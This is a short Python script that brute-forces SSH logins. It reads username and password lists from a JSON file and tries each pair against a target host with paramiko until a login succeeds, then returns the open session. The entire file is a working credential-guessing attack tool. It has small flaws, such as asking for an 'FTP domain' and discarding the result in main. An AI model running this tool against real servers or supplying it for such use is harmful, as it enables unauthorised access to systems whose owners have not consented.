#!/usr/bin/env python3
import configparser
import argparse
import json
import sys, paramiko

params = configparser.ConfigParser()
params.read('params.ini')

def sshconnect(username, password, ssh_domain):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ssh_domain, 22, username, password)
    except Exception as e:
        if (password == '' or username == ''):
            print(e)
        ssh = None

    return ssh

def bruteforce(users_dict, domain):
    for user in users_dict:
        for password in users_dict[user]:
            attempt = sshconnect(user, password, domain)
            if attempt:
                return attempt
    return None

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument('-domain')

    args = parser.parse_args()

    domain = args.domain

    if not domain:
        print('You must define an FTP domain')
        domain = input('Domain: ')

    if params['SSH']['users_pass'] == '':
        print('You must define user/pass JSON file')
        filename = input('Filename: ')

    else:
        filename = params['SSH']['users_pass']

    users_dict = json.load(open(filename, 'r'))

    return bruteforce(users_dict, domain)

if __name__== "__main__":
    main()
